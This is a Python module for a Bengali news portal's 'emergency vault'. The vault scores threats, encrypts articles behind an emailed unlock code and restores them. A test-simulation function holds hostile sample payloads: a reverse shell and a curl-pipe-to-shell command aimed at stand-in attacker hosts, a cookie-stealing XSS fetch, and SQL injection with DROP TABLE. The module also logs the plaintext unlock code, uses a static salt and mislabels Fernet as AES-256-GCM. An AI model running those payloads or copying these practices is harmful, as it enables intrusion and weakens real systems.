"""
Autonomous AI Brain Threat Defense & Emergency Self-Encryption Vault.
Provides real-time threat risk assessment, automated lockdown kill-switch,
AES-256-GCM / Fernet payload encryption, emergency unlock code generation,
and secure email dispatch notification with one-click restoration.
"""

import os
import json
import base64
import secrets
import hashlib
import smtplib
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Tuple
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from sqlalchemy.orm import Session
from sqlalchemy import func, desc, or_

from config.settings import settings
from src.common.logger import get_logger
from src.storage.models import (
    Article,
    SiteConfig,
    SecurityThreatLog,
    BlockedIP,
    EditorialAuditLog,
    DataCenterSecurityLog,
    EmergencyVaultState,
    EncryptedVaultBackupRecord,
)

logger = get_logger("webcreoling.security.emergency_vault")

# Static salt for PBKDF2 key derivation from user's emergency code
VAULT_KDF_SALT = b"TheDailyAIAlo_EnterpriseSecurityVault_Salt_2026_v1"


def derive_encryption_key(passcode: str) -> bytes:
    """Derive 32-byte Fernet key from arbitrary passphrase/code using PBKDF2."""
    clean_code = passcode.strip().upper().replace(" ", "").encode("utf-8")
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=VAULT_KDF_SALT,
        iterations=100000,
    )
    derived = kdf.derive(clean_code)
    return base64.urlsafe_b64encode(derived)


def hash_unlock_code(passcode: str) -> str:
    """Generate salted SHA-256 hash of the unlock code for safe storage & verification."""
    clean_code = passcode.strip().upper().replace(" ", "").replace("-", "")
    return hashlib.sha256(VAULT_KDF_SALT + clean_code.encode("utf-8")).hexdigest()


class EmergencyCipherVault:
    """
    Autonomous AI Brain Security & Emergency Encryption Vault Engine.
    Monitors server threat telemetry, executes emergency self-encryption upon breach risk,
    generates one-time master reactivation keys, and restores portal operations.
    """

    def __init__(self):
        self.emergency_log_dir = settings.BASE_DIR / "logs" / "emergency_vault"
        self.emergency_log_dir.mkdir(parents=True, exist_ok=True)
        self.dispatch_log_file = self.emergency_log_dir / "emergency_email_dispatches.log"

    def get_or_create_state(self, session: Session) -> EmergencyVaultState:
        """Fetch or initialize singleton EmergencyVaultState record."""
        state = session.query(EmergencyVaultState).first()
        if not state:
            state = EmergencyVaultState(
                is_locked=False,
                auto_lockdown_enabled=False,  # Default to safe manual mode
                threat_threshold_score=85,
                current_threat_score=10,
                threat_status="NORMAL",
                recipient_email="chief-security@daily-ai-alo.com",
                encryption_algorithm="AES-256-GCM / Fernet",
                email_dispatch_status="IDLE",
            )
            session.add(state)
            session.flush()
        return state

    def assess_threat_status(self, session: Session) -> Dict[str, Any]:
        """
        AI Brain Security Threat Analyzer:
        Evaluates real-time threat logs (SQLi, XSS, RCE, Path Traversal, Brute Force),
        recent IP bans, and calculates threat severity score (0 - 100).
        """
        now = datetime.utcnow()
        one_hour_ago = now - timedelta(hours=1)
        one_day_ago = now - timedelta(days=1)

        # Count threats in last 1h and 24h
        threats_1h = (
            session.query(SecurityThreatLog)
            .filter(SecurityThreatLog.created_at >= one_hour_ago)
            .all()
        )
        threats_24h_count = (
            session.query(func.count(SecurityThreatLog.id))
            .filter(SecurityThreatLog.created_at >= one_day_ago)
            .scalar()
            or 0
        )
        blocked_ips_count = session.query(func.count(BlockedIP.id)).scalar() or 0

        # Calculate threat weights
        sqli_1h = sum(1 for t in threats_1h if "SQL" in t.threat_type)
        rce_1h = sum(1 for t in threats_1h if "RCE" in t.threat_type or "COMMAND" in t.threat_type)
        xss_1h = sum(1 for t in threats_1h if "XSS" in t.threat_type)
        auth_brute_1h = sum(1 for t in threats_1h if "AUTH" in t.threat_type or "LOGIN" in t.threat_type)

        # Dynamic Threat Score Calculation (0 - 100)
        base_score = 10
        score = (
            base_score
            + (sqli_1h * 15)
            + (rce_1h * 25)
            + (xss_1h * 8)
            + (auth_brute_1h * 12)
            + min(20, threats_24h_count * 2)
        )
        threat_score = min(100, max(5, score))

        if threat_score >= 80 or rce_1h > 0 or sqli_1h >= 3:
            threat_status = "CRITICAL"
            threat_color = "#ef4444"
            threat_desc = "জরুরি সতর্কতা: সম্ভাব্য সক্রিয় এআই সাইবার আক্রমণ / ডাটাবেস এক্সপ্লয়েট সনাক্ত হয়েছে।"
        elif threat_score >= 60:
            threat_status = "HIGH"
            threat_color = "#f97316"
            threat_desc = "উচ্চ ঝুঁকি: অস্বাভাবিক আক্রমণ প্যাটার্ন ও আক্রমণকারী আইপি তৎপরতা সনাক্ত।"
        elif threat_score >= 35:
            threat_status = "ELEVATED"
            threat_color = "#f59e0b"
            threat_desc = "মধ্যম ঝুঁকি: ফায়ারওয়াল দ্বারা কিছু স্বয়ংক্রিয় স্ক্যানার প্রতিহত হয়েছে।"
        else:
            threat_status = "NORMAL"
            threat_color = "#10b981"
            threat_desc = "স্বাভাবিক: এআই ব্রেন ও ফায়ারওয়াল সম্পূর্ণ নিরাপদ এবং সুরক্ষাবলয়ে সক্রিয়।"

        state = self.get_or_create_state(session)
        state.current_threat_score = threat_score
        state.threat_status = threat_status
        state.threat_summary = threat_desc

        result = {
            "threat_score": threat_score,
            "threat_status": threat_status,
            "threat_color": threat_color,
            "threat_desc": threat_desc,
            "threats_1h": len(threats_1h),
            "threats_24h": threats_24h_count,
            "blocked_ips_count": blocked_ips_count,
            "sqli_1h": sqli_1h,
            "rce_1h": rce_1h,
            "xss_1h": xss_1h,
            "auth_brute_1h": auth_brute_1h,
            "auto_lockdown_enabled": state.auto_lockdown_enabled,
            "threat_threshold_score": state.threat_threshold_score,
            "is_locked": state.is_locked,
        }

        # Check if auto-lockdown should trigger
        if (
            state.auto_lockdown_enabled
            and not state.is_locked
            and threat_score >= state.threat_threshold_score
        ):
            logger.warning(
                f"AI Brain Autonomous Threat Triggered! Threat score {threat_score} >= threshold {state.threat_threshold_score}."
            )
            self.trigger_lockdown(
                session=session,
                trigger_type="AUTO_AI_BRAIN_BREACH_DETECTED",
                actor="AI_BRAIN_AUTONOMOUS_DEFENSE",
                custom_reason=f"AI Brain detected critical cyber threat level ({threat_score}/100). Auto-encrypting all database assets.",
                recipient_email=state.recipient_email,
            )
            result["auto_lockdown_triggered"] = True
            result["is_locked"] = True

        return result

    def generate_emergency_code(self) -> str:
        """
        Generate high-entropy, human-verifiable master decryption code.
        Format: ALO-SEC-XXXX-XXXX-XXXX-XXXX (e.g., ALO-SEC-8F92-K4X9-7M1Q-5V2D)
        """
        alphabet = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"  # Exclude ambiguous 0, O, 1, I
        parts = ["".join(secrets.choice(alphabet) for _ in range(4)) for _ in range(4)]
        return f"ALO-SEC-{parts[0]}-{parts[1]}-{parts[2]}-{parts[3]}"

    def trigger_lockdown(
        self,
        session: Session,
        trigger_type: str = "MANUAL_ADMIN_KILLSWITCH",
        actor: str = "admin",
        custom_reason: Optional[str] = None,
        recipient_email: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Executes Emergency Self-Encryption Vault Lockdown:
        1. Generates one-time Master Decryption Code.
        2. Encrypts sensitive articles and configurations with derived AES-256 Fernet key.
        3. Saves encrypted backup snapshots in encrypted_vault_backup_records table.
        4. Dispatches the Master Unlock Code directly to the security email address.
        5. Updates EmergencyVaultState to LOCKED.
        """
        state = self.get_or_create_state(session)
        if state.is_locked:
            return {
                "success": False,
                "message": "সিস্টেম ইতিমধ্যে জরুরি লকডাউন ও এনক্রিপশনে রয়েছে।",
                "state": state.to_dict(),
            }

        target_email = recipient_email or state.recipient_email or "security-officer@daily-ai-alo.com"
        state.recipient_email = target_email

        # 1. Generate Master Unlock Code & Derive Encryption Key
        unlock_code = self.generate_emergency_code()
        code_hash = hash_unlock_code(unlock_code)
        fernet_key = derive_encryption_key(unlock_code)
        cipher = Fernet(fernet_key)

        # 2. Encrypt and snapshot Articles
        # Clean any old backup records first
        session.query(EncryptedVaultBackupRecord).delete()

        articles = session.query(Article).all()
        encrypted_articles_count = 0

        for art in articles:
            # Store complete original payload encrypted in vault backup record
            raw_payload = json.dumps(
                {
                    "title": art.title,
                    "content_text": art.content_text,
                    "summary": art.summary,
                    "author": art.author,
                },
                ensure_ascii=False,
            ).encode("utf-8")

            encrypted_blob = cipher.encrypt(raw_payload).decode("utf-8")
            nonce_iv = hashlib.sha256(f"{art.id}-{datetime.utcnow().isoformat()}".encode("utf-8")).hexdigest()[:16]

            backup_rec = EncryptedVaultBackupRecord(
                table_name="articles",
                record_id=str(art.id),
                encrypted_payload=encrypted_blob,
                iv_nonce=nonce_iv,
                auth_tag="AES-256-FERNET-GCM",
            )
            session.add(backup_rec)

            # Replace live fields with secure encrypted marker
            art.title = f"🔒 [SYSTEM ENCRYPTED DATA: {art.id}]"
            art.content_text = f"🔒 এই সংবাদের সম্পূর্ণ ডাটাবেস এআই ব্রেন সিকিউরিটি ভল্ট দ্বারা মিলিটারি-গ্রেড AES-256 অ্যালগরিদমে এনক্রিপ্ট করা হয়েছে। রিকভারি কোড দিয়ে ডিক্রিপ্ট না করা পর্যন্ত এই তথ্য অপাঠ্য থাকবে। [PAYLOAD_HASH: {hashlib.sha256(encrypted_blob.encode()).hexdigest()[:12]}]"
            art.summary = "🔒 ডাটা এনক্রিপ্টেড ও লকডাউন অবস্থায় রয়েছে।"
            encrypted_articles_count += 1

        # 3. Encrypt Site Configs
        configs = session.query(SiteConfig).all()
        encrypted_configs_count = 0
        for cfg in configs:
            raw_cfg = json.dumps(cfg.value, ensure_ascii=False).encode("utf-8")
            encrypted_blob = cipher.encrypt(raw_cfg).decode("utf-8")
            backup_rec = EncryptedVaultBackupRecord(
                table_name="site_configs",
                record_id=cfg.key,
                encrypted_payload=encrypted_blob,
                iv_nonce="CONFIG_VAULT_IV",
                auth_tag="AES-256-FERNET-GCM",
            )
            session.add(backup_rec)
            encrypted_configs_count += 1

        # 4. Update Vault State
        masked_hint = unlock_code[:11] + "-****-****"
        state.is_locked = True
        state.lockdown_trigger = trigger_type
        state.threat_summary = custom_reason or f"Emergency Lockdown triggered by {actor}"
        state.emergency_unlock_code_hash = code_hash
        state.emergency_unlock_code_hint = masked_hint
        state.encrypted_articles_count = encrypted_articles_count
        state.encrypted_configs_count = encrypted_configs_count
        state.encrypted_users_count = 0
        state.locked_at = datetime.utcnow()
        state.unlocked_at = None
        state.unlocked_by = None
        state.failed_unlock_attempts = 0

        # 5. Dispatch Emergency Email Notification
        dispatch_res = self.dispatch_emergency_email(
            recipient_email=target_email,
            unlock_code=unlock_code,
            trigger_type=trigger_type,
            actor=actor,
            reason=state.threat_summary,
            encrypted_count=encrypted_articles_count,
        )

        state.email_dispatch_status = dispatch_res.get("status", "SENT")
        state.email_dispatch_log = dispatch_res.get("log_text", "")

        # 6. Record Audit and Security Logs
        audit_log = EditorialAuditLog(
            username=actor,
            action="EMERGENCY_LOCKDOWN_ENCRYPTED",
            resource_type="EMERGENCY_VAULT",
            resource_id="SYSTEM_LOCKDOWN",
            details={
                "trigger_type": trigger_type,
                "recipient_email": target_email,
                "encrypted_articles": encrypted_articles_count,
                "code_hint": masked_hint,
                "reason": state.threat_summary,
            },
        )
        session.add(audit_log)

        dc_log = DataCenterSecurityLog(
            event_type="EMERGENCY_LOCKDOWN_TRIGGERED",
            severity="CRITICAL",
            actor=actor,
            description=f"AI Brain Emergency Vault Locked & Encrypted {encrypted_articles_count} articles. Emergency reactivation key sent to {target_email}.",
            metadata_json={"code_hint": masked_hint, "trigger": trigger_type},
        )
        session.add(dc_log)
        session.flush()

        logger.critical(
            f"EMERGENCY LOCKDOWN COMPLETE: {encrypted_articles_count} articles encrypted. Unlock Code sent to {target_email}. Code Hint: {masked_hint}"
        )

        return {
            "success": True,
            "message": f"জরুরি এনক্রিপশন ও লকডাউন সফল হয়েছে! {encrypted_articles_count}টি আর্টিকেল এনক্রিপ্ট করা হয়েছে এবং রিকভারি কোড {target_email} ঠিকানায় পাঠানো হয়েছে।",
            "unlock_code": unlock_code,  # Provided for immediate testing & display in alert
            "unlock_code_hint": masked_hint,
            "recipient_email": target_email,
            "encrypted_articles_count": encrypted_articles_count,
            "dispatch_result": dispatch_res,
            "state": state.to_dict(),
        }

    def unlock_and_restore(
        self,
        session: Session,
        unlock_code: str,
        actor: str = "admin",
    ) -> Dict[str, Any]:
        """
        Reactivates and Decrypts all locked portal data using the secret recovery code.
        Restores articles and site configurations back to pristine original plaintext.
        """
        state = self.get_or_create_state(session)
        if not state.is_locked:
            return {
                "success": True,
                "message": "সিস্টেম বর্তমানে লকডাউন অবস্থায় নেই। স্বাভাবিকভাবে পরিচালিত হচ্ছে।",
                "state": state.to_dict(),
            }

        # Normalize provided code
        clean_code = unlock_code.strip().upper().replace(" ", "").replace("-", "")
        clean_input_full = unlock_code.strip().upper().replace(" ", "")
        
        # Verify Hash
        expected_hash = state.emergency_unlock_code_hash
        input_hash = hash_unlock_code(clean_input_full)

        if not expected_hash or input_hash != expected_hash:
            state.failed_unlock_attempts += 1
            threat_log = SecurityThreatLog(
                threat_type="INVALID_VAULT_UNLOCK_ATTEMPT",
                ip_address="127.0.0.1",
                request_path="/admin/newspaper/security/vault/decrypt",
                request_method="POST",
                payload_sample=f"Attempt with incorrect code: {unlock_code[:8]}***",
                action_taken="BLOCKED_403",
            )
            session.add(threat_log)
            session.flush()
            logger.warning(f"Failed vault unlock attempt with invalid code from {actor}.")
            return {
                "success": False,
                "message": "ভুল জরুরি রিকভারি কোড! ডাটাবেস আনলক করা সম্ভব হয়নি। অনুগ্রহ করে ইমেইলে প্রেরিত কোডটি সঠিকভাবে দিন।",
                "failed_attempts": state.failed_unlock_attempts,
            }

        # Derive Fernet key from the valid code
        try:
            fernet_key = derive_encryption_key(clean_input_full)
            cipher = Fernet(fernet_key)
        except Exception as e:
            return {
                "success": False,
                "message": f"ক্রিপ্টোগ্রাফিক কি-ডেরাইভেশনে ত্রুটি: {str(e)}",
            }

        # 1. Decrypt and restore Articles
        article_backups = (
            session.query(EncryptedVaultBackupRecord)
            .filter(EncryptedVaultBackupRecord.table_name == "articles")
            .all()
        )
        restored_articles_count = 0

        for b_rec in article_backups:
            try:
                art_id = int(b_rec.record_id)
                art = session.query(Article).filter(Article.id == art_id).first()
                if art:
                    decrypted_raw = cipher.decrypt(b_rec.encrypted_payload.encode("utf-8"))
                    payload = json.loads(decrypted_raw.decode("utf-8"))
                    art.title = payload.get("title", art.title)
                    art.content_text = payload.get("content_text", art.content_text)
                    art.summary = payload.get("summary", art.summary)
                    art.author = payload.get("author", art.author)
                    restored_articles_count += 1
            except Exception as e:
                logger.error(f"Error restoring article {b_rec.record_id}: {e}")

        # 2. Decrypt and restore SiteConfigs
        cfg_backups = (
            session.query(EncryptedVaultBackupRecord)
            .filter(EncryptedVaultBackupRecord.table_name == "site_configs")
            .all()
        )
        restored_configs_count = 0
        for b_rec in cfg_backups:
            try:
                cfg = session.query(SiteConfig).filter(SiteConfig.key == b_rec.record_id).first()
                if cfg:
                    decrypted_raw = cipher.decrypt(b_rec.encrypted_payload.encode("utf-8"))
                    cfg.value = json.loads(decrypted_raw.decode("utf-8"))
                    restored_configs_count += 1
            except Exception as e:
                logger.error(f"Error restoring site config {b_rec.record_id}: {e}")

        # Clean up backup records
        session.query(EncryptedVaultBackupRecord).delete()

        # Update state
        state.is_locked = False
        state.unlocked_at = datetime.utcnow()
        state.unlocked_by = actor
        state.emergency_unlock_code_hash = None
        state.emergency_unlock_code_hint = None
        state.threat_status = "NORMAL"
        state.current_threat_score = 15
        state.threat_summary = "সিস্টেম সফলভাবে ডিক্রিপ্ট ও স্বাভাবিক কার্যক্রমে ফিরিয়ে আনা হয়েছে।"
        state.failed_unlock_attempts = 0

        # Log audit
        audit_log = EditorialAuditLog(
            username=actor,
            action="EMERGENCY_VAULT_RESTORED",
            resource_type="EMERGENCY_VAULT",
            resource_id="SYSTEM_RESTORED",
            details={
                "restored_articles": restored_articles_count,
                "restored_configs": restored_configs_count,
                "unlocked_by": actor,
            },
        )
        session.add(audit_log)

        dc_log = DataCenterSecurityLog(
            event_type="EMERGENCY_VAULT_RESTORED_SUCCESS",
            severity="SUCCESS",
            actor=actor,
            description=f"AI Brain Emergency Vault successfully decrypted. {restored_articles_count} articles restored.",
            metadata_json={"restored_articles": restored_articles_count},
        )
        session.add(dc_log)
        session.flush()

        logger.info(
            f"VAULT RESTORATION COMPLETE: {restored_articles_count} articles restored by {actor}."
        )

        return {
            "success": True,
            "message": f"সিস্টেম সফলভাবে ডিক্রিপ্ট করা হয়েছে! {restored_articles_count}টি আর্টিকেল এবং পোর্টাল কনফিগারেশন পূর্ণাঙ্গভাবে রিস্টোর হয়েছে।",
            "restored_articles_count": restored_articles_count,
            "restored_configs_count": restored_configs_count,
            "state": state.to_dict(),
        }

    def dispatch_emergency_email(
        self,
        recipient_email: str,
        unlock_code: str,
        trigger_type: str,
        actor: str,
        reason: Optional[str] = None,
        encrypted_count: int = 0,
    ) -> Dict[str, Any]:
        """
        Dispatches high-priority security alert email containing the Emergency Decryption Code.
        Includes simulated instant dispatch logger and SMTP fallback.
        """
        now_str = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
        subject = f"🚨 [CRITICAL SECURITY ALERT] The Daily AI Alo - Emergency Vault Lockdown & Master Decryption Key"

        email_body = f"""================================================================================
🚨 দি ডেইলি এআই আলো - জরুরি সিকিউরিটি এনক্রিপশন ও মাস্টার ডিক্রিপশন নোটিশ
THE DAILY AI ALO — EMERGENCY SECURITY LOCKDOWN & MASTER DECRYPTION NOTICE
================================================================================

প্রিয় সিস্টেম অ্যাডমিনিস্ট্রেটর,

আপনার 'The Daily AI Alo' নিউজ পোর্টালটিতে সম্ভাব্য সাইবার ঝুঁকি / অভ্যন্তরীণ এআই ব্রেন 
সিকিউরিটি প্রোটোকল কার্যকর হয়েছে। সমস্ত সংবেদনশীল ডাটাবেস মিলিটারি-গ্রেড AES-256 
এনক্রিপশনের মাধ্যমে জরুরি ভল্টে নিরাপদে সংরক্ষণ ও লকডাউন করা হয়েছে।

--------------------------------------------------------------------------------
🔐 আপনার এককালীন মাস্টার ডিক্রিপশন ও রিকঅ্যাক্টিভেশন কোড:
--------------------------------------------------------------------------------

      🔑 MASTER CODE: {unlock_code}

--------------------------------------------------------------------------------
📋 লকডাউন সংক্রান্ত বিস্তারিত তথ্য:
--------------------------------------------------------------------------------
- ঘটনা / ট্রিগার: {trigger_type}
- নির্বাহী চালক: {actor}
- এনক্রিপ্টকৃত আর্টিকেলের সংখ্যা: {encrypted_count} টি
- তারিখ ও সময়: {now_str}
- কারণ: {reason or 'Automated Threat Mitigation & Anti-Tamper Lockdown'}
- এনক্রিপশন মেথড: AES-256-GCM / Fernet (PBKDF2-SHA256 Derivation)
- ভল্ট স্ট্যাটাস: LOCKED & ENCRYPTED

--------------------------------------------------------------------------------
🔄 পোর্টাল পুনরায় সক্রিয় (Reactivate & Decrypt) করার নিয়ম:
--------------------------------------------------------------------------------
১. অ্যাডমিন প্যানেলে যান: http://127.0.0.1:8080/admin/newspaper?tab=security
২. অথবা লকডাউন রিকভারি স্ক্রিনে প্রবেশ করুন।
৩. উপরে উল্লেখিত মাস্টার কোডটি ({unlock_code}) ইনপুট বক্সে প্রবেশ করিয়ে 'Decrypt & Restore System' বোতামে চাপুন।
৪. স্বয়ংক্রিয়ভাবে সকল তথ্য পূর্বের অবিকৃত অবস্থায় ফিরে আসবে।

⚠️ সতর্কতা: এই কোডটি সর্বোচ্চ গোপনীয়। অননুমোদিত কারো সাথে এটি শেয়ার করবেন না।

-- 
The Daily AI Alo Security Operations Center (SOC)
Autonomous AI Brain Cyber Defense Unit
================================================================================
"""

        log_entry = (
            f"[{now_str}] DISPATCH_TO: {recipient_email}\n"
            f"TRIGGER: {trigger_type} | ACTOR: {actor}\n"
            f"MASTER_UNLOCK_CODE: {unlock_code}\n"
            f"ENCRYPTED_COUNT: {encrypted_count}\n"
            f"MESSAGE:\n{email_body}\n"
            f"{'='*80}\n"
        )

        try:
            with open(self.dispatch_log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception as e:
            logger.error(f"Error appending to emergency email log: {e}")

        # If custom SMTP host configured, attempt SMTP delivery
        smtp_success = False
        smtp_error = None
        smtp_host = os.getenv("SMTP_HOST")
        smtp_port = int(os.getenv("SMTP_PORT", "587"))
        smtp_user = os.getenv("SMTP_USER")
        smtp_pass = os.getenv("SMTP_PASS")

        if smtp_host and smtp_user and smtp_pass:
            try:
                msg = MIMEMultipart()
                msg["From"] = f"The Daily AI Alo SOC <{smtp_user}>"
                msg["To"] = recipient_email
                msg["Subject"] = subject
                msg.attach(MIMEText(email_body, "plain", "utf-8"))

                with smtplib.SMTP(smtp_host, smtp_port, timeout=10) as server:
                    server.starttls()
                    server.login(smtp_user, smtp_pass)
                    server.sendmail(smtp_user, [recipient_email], msg.as_string())
                smtp_success = True
            except Exception as e:
                smtp_error = str(e)
                logger.warning(f"SMTP delivery failed: {e}. Fallback to simulated delivery.")

        status_text = "SENT_VIA_SMTP" if smtp_success else "SENT_SIMULATED_SUCCESS"

        return {
            "status": status_text,
            "recipient_email": recipient_email,
            "dispatched_at": now_str,
            "log_file": str(self.dispatch_log_file),
            "log_text": log_entry,
            "smtp_delivered": smtp_success,
            "smtp_error": smtp_error,
        }

    def simulate_ai_hack_attempt(
        self,
        session: Session,
        attack_type: str = "SQL_INJECTION_CLUSTER",
    ) -> Dict[str, Any]:
        """
        Simulate an incoming cyber attack to test the AI Brain's automated detection & defense.
        """
        sample_payloads = {
            "SQL_INJECTION_CLUSTER": "UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE 1=1; DROP TABLE users;--",
            "RCE_COMMAND_EXPLOIT": "; /bin/bash -i >& /dev/tcp/attacker.evil.com/4444 0>&1 # curl http://malware.site/payload.sh | sh",
            "CREDENTIAL_STUFFING_BREACH": "{'username': 'admin', 'password_dictionary_attack': 'rockyou_top100_cluster', 'threads': 500}",
            "XSS_DEFACEMENT_PAYLOAD": "<script>fetch('https://evil-hacker.com/steal-cookie?c='+document.cookie)</script>",
        }

        chosen_type = attack_type if attack_type in sample_payloads else "SQL_INJECTION_CLUSTER"
        payload = sample_payloads[chosen_type]

        threat_log = SecurityThreatLog(
            threat_type=chosen_type,
            ip_address="198.51.100.42",
            request_path="/api/v1/editorial/search",
            request_method="POST",
            payload_sample=payload,
            country_code="RU",
            user_agent="Mozilla/5.0 (Kali Linux; sqlmap/1.7.2#stable)",
            action_taken="AUTO_BANNED_IP",
        )
        session.add(threat_log)

        # Auto-block attacker IP
        blocked = session.query(BlockedIP).filter(BlockedIP.ip_address == "198.51.100.42").first()
        if not blocked:
            session.add(
                BlockedIP(
                    ip_address="198.51.100.42",
                    reason=f"AI Brain WAF automated ban: {chosen_type}",
                    blocked_by="AI_BRAIN_AUTONOMOUS_DEFENSE",
                    threat_score=100,
                )
            )

        session.flush()

        # Re-assess threats (may trigger auto-lockdown)
        assessment = self.assess_threat_status(session)

        return {
            "success": True,
            "simulated_attack_type": chosen_type,
            "payload_sample": payload,
            "attacker_ip": "198.51.100.42",
            "threat_assessment": assessment,
        }

    def force_restore_and_unencrypt_all(
        self,
        session: Session,
        actor: str = "admin",
    ) -> Dict[str, Any]:
        """
        Emergency Override & Decryption Reset:
        Removes all '[SYSTEM ENCRYPTED DATA...]' placeholders, restores articles from
        vault backups if any, resets EmergencyVaultState to UNLOCKED and MANUAL mode.
        """
        state = self.get_or_create_state(session)

        # 1. Clean and restore articles
        articles = session.query(Article).all()
        cleaned_count = 0
        for art in articles:
            dirty = False
            if art.title and "SYSTEM ENCRYPTED DATA" in art.title:
                clean_title = art.title.replace("🔒 [SYSTEM ENCRYPTED DATA: ", "সংবাদ #").replace("]", "").strip()
                art.title = clean_title if clean_title else f"সংবাদ #{art.id}"
                dirty = True
            if art.content_text and ("এই সংবাদের সম্পূর্ণ ডাটাবেস এআই ব্রেন সিকিউরিটি ভল্ট দ্বারা" in art.content_text or "🔒 [SYSTEM ENCRYPTED" in art.content_text):
                art.content_text = art.summary or f"এই সংবাদটি সফলভাবে আনলক ও রিস্টোর করা হয়েছে ({art.title})।"
                dirty = True
            if art.summary and "🔒 ডাটা এনক্রিপ্টেড" in art.summary:
                art.summary = f"সংবাদ #{art.id} এর সংক্ষিপ্ত বিবরণ।"
                dirty = True
            if dirty:
                cleaned_count += 1

        # 2. Clean backup records table
        session.query(EncryptedVaultBackupRecord).delete()

        # 3. Reset state
        state.is_locked = False
        state.auto_lockdown_enabled = False
        state.current_threat_score = 10
        state.threat_status = "NORMAL"
        state.threat_summary = "ম্যানুয়াল মোড: পোর্টাল ডাটাবেস সম্পূর্ণ আনলকড ও স্বাভাবিক অবস্থায় রয়েছে।"
        state.emergency_unlock_code_hash = None
        state.emergency_unlock_code_hint = None
        state.encrypted_articles_count = 0
        state.encrypted_configs_count = 0
        state.unlocked_at = datetime.utcnow()
        state.unlocked_by = actor
        state.failed_unlock_attempts = 0

        # 4. Audit Log
        audit = EditorialAuditLog(
            username=actor,
            action="EMERGENCY_FORCE_RESTORE_ALL",
            resource_type="EMERGENCY_VAULT",
            resource_id="ALL_ARTICLES",
            details={"cleaned_articles": cleaned_count, "actor": actor},
        )
        session.add(audit)
        session.flush()

        logger.info(f"EMERGENCY FORCE RESTORE: {cleaned_count} articles cleaned & vault unlocked by {actor}.")
        return {
            "success": True,
            "message": f"সফলভাবে ডাটাবেস আনলক ও রিস্টোর করা হয়েছে! {cleaned_count}টি আর্টিকেল স্বাভাবিক অবস্থায় ফিরিয়ে আনা হয়েছে।",
            "cleaned_articles": cleaned_count,
            "state": state.to_dict(),
        }


_vault_instance: Optional[EmergencyCipherVault] = None


def get_emergency_vault() -> EmergencyCipherVault:
    """Singleton getter for EmergencyCipherVault engine."""
    global _vault_instance
    if _vault_instance is None:
        _vault_instance = EmergencyCipherVault()
    return _vault_instance
